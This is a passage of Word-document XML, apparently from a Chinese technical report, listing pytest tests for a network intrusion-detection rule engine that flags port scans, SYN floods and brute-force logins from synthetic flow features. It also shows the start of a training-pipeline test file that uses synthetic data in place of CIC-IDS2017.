          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    fired = 0</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02ECB1D3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(200):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="727F67E4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hits = engine.observe("p1", 1000.0 + i * 0.01, key(dport=1000 + i), probe())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="22AB3F9A">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        fired += sum(1 for h in hits if h.rule == "port_scan")</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="72A65747">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert fired == 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="09EF2CFA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="031F963F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="51A7B604">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_syn_flood_and_brute_force_are_told_apart_by_handshake():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6035E195">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    flood = RuleEngine(window=60.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="610235B9">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(50):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="27E7569E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # SYN 置位、ACK 未置位 → 半连接</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="01B16588">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        flood.observe("p1", 2000.0 + i * 0.01, key(dport=443, sport=50000 + i),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="37410742">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                      feats(**{"Total Fwd Packets": 1, "Total Backward Packets": 0,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7B893CF7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                               "SYN Flag Count": 1, "ACK Flag Count": 0}))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="30939210">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert flood.counts.get("syn_flood") == 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="769513B7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert flood.hits_by_category().get("DDoS") == 1</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="507E1655">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="48EAE633">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    brute = RuleEngine(window=60.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2AEC2812">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    hits = []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55CE6CC7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(30):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39979748">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        # 握手完成、连接很短 → 暴力破解</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="353B2AAF">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        hits = brute.observe("p1", 3000.0 + i * 0.01, key(dport=22, sport=60000 + i),</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1A18BF2D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                             feats(**{"Total Fwd Packets": 6, "Total Backward Packets": 4,</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1465B13D">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">                                      "SYN Flag Count": 1, "ACK Flag Count": 3}))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="584FB8C1">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "brute_force" in [h.rule for h in hits]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="13773780">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert {h.category for h in hits} == {"Patator"}</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FB9A831">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2AE57083">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="00490CB0">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_engine_separates_probes():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BAAA463">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """两个探针各自看到自己那部分流量，计数不能混在一起。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="40912BE3">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    engine = RuleEngine(window=60.0)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="705368AC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(15):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0DC188A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        engine.observe("p1", 4000.0, key(dport=1000 + i), probe())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1966D526">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(15):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="180D1945">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        assert engine.observe("p2", 4000.0, key(dport=1000 + i), probe()) == []</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="288A69BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="59F6F851">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="09B7C916">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_tracked_sources_are_bounded():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="39ABFC51">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    """扫描会瞬间造出大量源；不设上限内存会一直涨。"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="635B90FB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    engine = RuleEngine(window=60.0, max_scope=10)</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3A8BD8D4">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    for i in range(50):</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7BF769C6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">        engine.observe("p1", 5000.0, key(src=f"10.0.1.{i}", dport=80), probe())</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CEA5BC2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert len(engine._src) &lt;= 10</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1AD96E19">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="651118B6">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="3F07657E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>def test_evidence_carries_wording_not_z_score():</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="336D9676">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    hit = pick(flow_rules(feats(**{"Total Fwd Packets": 500, "Flow Packets/s": 5000})))</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7AE5E8BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    ev = hit.as_evidence()</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="73DBA2C7">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "detail" in ev and "阈值" in ev["detail"]</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4FEA695F">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t xml:space="preserve">    assert "z_score" not in ev</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="56FEC75A">
      <w:pPr>
        <w:spacing w:before="0" w:after="160"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4396A545">
      <w:pPr>
        <w:keepNext/>
        <w:spacing w:before="160" w:after="40"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="黑体" w:hAnsi="黑体" w:eastAsia="黑体"/>
          <w:b/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>代码 3-31　tests/test_train_pipeline.py</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="宋体" w:hAnsi="宋体" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>（217 行）　训练流水线测试</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="652BBE18">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""训练管线的数据侧自测：标签归并、去重、缺失/无穷值剔除。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0AB5EA5E">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6EAA05DC">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>不去不碰真实数据集，全部用合成 CSV，保证 CI 上不依赖 1.2 GB 的 CIC-IDS2017。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B0AD699">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>"""</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="678E7194">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7FCADDCB">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import numpy as np</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B10D9BA">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import pandas as pd</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="53C54D0B">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>import pytest</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="26C7F8A5">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="668481B2">
      <w:pPr>
        <w:widowControl w:val="0"/>
        <w:spacing w:before="0" w:after="0" w:line="240" w:lineRule="auto"/>
        <w:ind w:left="0"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas" w:eastAsia="宋体"/>
          <w:b w:val="0"/>
          <w:color w:val="000000"/>
          <w:sz w:val="16"/>
        </w:rPr>
        <w:t>from models.train import LABEL_MAP, load_dataset, main, normalize_label</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="63077F87">
      <w:pPr>
        <w:widowControl w:val="0"/>
